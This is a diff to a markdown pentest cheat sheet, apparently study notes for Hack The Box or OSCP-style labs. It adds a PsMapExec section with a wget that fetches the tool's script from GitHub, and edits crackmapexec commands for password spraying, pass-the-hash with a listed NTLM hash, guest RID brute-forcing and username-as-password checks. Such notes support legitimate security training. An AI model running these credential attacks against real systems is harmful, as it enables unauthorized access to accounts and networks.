@@ -40,6 +40,7 @@
   - [hashcrack](#hashcrack)
   - [Windows](#windows-2)
     - [crackmap](#crackmap)
+    - [PsMapexec](#psmapexec)
     - [kerbrute](#kerbrute)
     - [mimikatz](#mimikatz)
     - [AD](#ad)
@@ -438,10 +439,14 @@ john --wordlist=/usr/share/wordlists/fasttrack.txt --rules /usr/share/john/rules
 ## Windows
 ### crackmap
 ```bash
-crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success --local-auth
 crackmapexec smb 192.168.226.189 192.168.226.191 192.168.226.248-249 -u user -H 54abdf854d8c0653b1be3458454e4a3b -d htb.local --continue-on-success
 crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
 crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
+```
+### PsMapexec
+```
+wget https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1
 ```
 ### kerbrute
 ```bash
